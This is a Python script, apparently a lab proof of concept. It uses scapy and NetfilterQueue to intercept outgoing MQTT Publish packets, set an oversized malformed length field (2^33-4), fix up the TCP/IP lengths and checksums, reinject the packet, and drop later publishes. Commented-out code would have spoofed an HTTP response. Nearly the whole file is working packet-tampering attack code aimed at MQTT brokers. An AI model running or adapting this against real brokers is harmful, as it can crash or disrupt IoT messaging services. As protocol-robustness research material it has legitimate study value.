from scapy.all import *
from scapy.contrib.mqtt import *
from netfilterqueue import NetfilterQueue
from scapy.layers.http import *
import os

publish_cnt = 0
spoofed_load = b'<html>\n<h1>Secret</h1>\n<p>2017011464\t\n</p>\n</html>\n'

def process_vic_packet(packet):
    global publish_cnt
    pkt = IP(packet.get_payload())
    if  pkt.haslayer(MQTTPublish):
        # pkt[MQTTPublish].length = 100
        # print("len1 ", pkt[MQTT].len)
        if publish_cnt > 0:
            packet.drop()
            return
        publish_cnt = publish_cnt + 1
        pkt[MQTT].len = (2**33) - 4 
        # print(pkt[MQTT].len)
        pkt[TCP].len = pkt[TCP].len + 4
        del pkt[TCP].chksum
        pkt[IP].len = pkt[IP].len + 4
        del pkt[IP].chksum

        # pkt[TCP].payload = HTTPResponse(Http_Version = b'HTTP/1.1', Status_Code = b'200', Reason_Phrase = b'OK', Accept_Ranges = b'bytes', Connection = b'keep-alive', \
        #                         Content_Type = b'text/html; encoding=utf-8', Content_Length = str(len(spoofed_load)))/\
        #                     Raw(load = spoofed_load)
        # pkt[TCP].len = len(bytes(pkt[TCP].payload))
        # del pkt[TCP].chksum
        # del pkt[IP].len
        # del pkt[IP].chksum
        
        # print("len2 ", pkt[MQTT].len)
        
        # packet.set_payload(bytes(pkt))
        # print("catch MQTT Publish! ", pkt[MQTTPublish].summary)
        # print(pkt[MQTT].summary)
        # print(bytes(pkt))
        packet.drop()
        send(pkt, iface = "tap0")
        # print(newp.summary)
        # ack_ = IP(src = newp[IP].dst, dst = newp[IP].src)/\
        #     TCP(dport = newp[TCP].sport, sport = newp[TCP].dport, flags = 0x010,  seq = newp[TCP].ack, ack = newp[TCP].seq + 4)
        # send(ack_, iface = "tap0")
        # print(bytes(pkt[MQTT]))
        # ls(pkt[MQTT])
        # print(pkt[MQTT].summary)
        # print("--------------------------->")
        # ls(pkt[MQTTPublish])
        # print(pkt[MQTTPublish].summary)

        # packet.accept()
        
        # print("len3 ", pkt[MQTT].len)
        aa = 1
    else:
        packet.accept()
    


QUEUE_NUM0 = 0
# insert the iptables INPUT rule
os.system("iptables -A OUTPUT -p tcp -s 192.0.2.2 -j NFQUEUE --queue-num {}".format(QUEUE_NUM0))
# os.system("iptables -A INPUT -s 10.1.0.3 -d 10.0.2.17 -p TCP -j NFQUEUE --queue-num {}".format(QUEUE_NUM1))
# instantiate the netfilter queue
queue0 = NetfilterQueue()

try:
    # bind the queue number to our callback `process_packet`
    # and start it
    queue0.bind(QUEUE_NUM0, process_vic_packet)
    # queue1.bind(QUEUE_NUM1, process_server_packet)
    queue0.run()
    
    # _thread.start_new_thread(queue0.run,())
    # _thread.start_new_thread(queue1.run,())
    
    
except KeyboardInterrupt:
    # if want to exit, make sure we
    # remove that rule we just inserted, going back to normal.
    os.system("iptables --flush")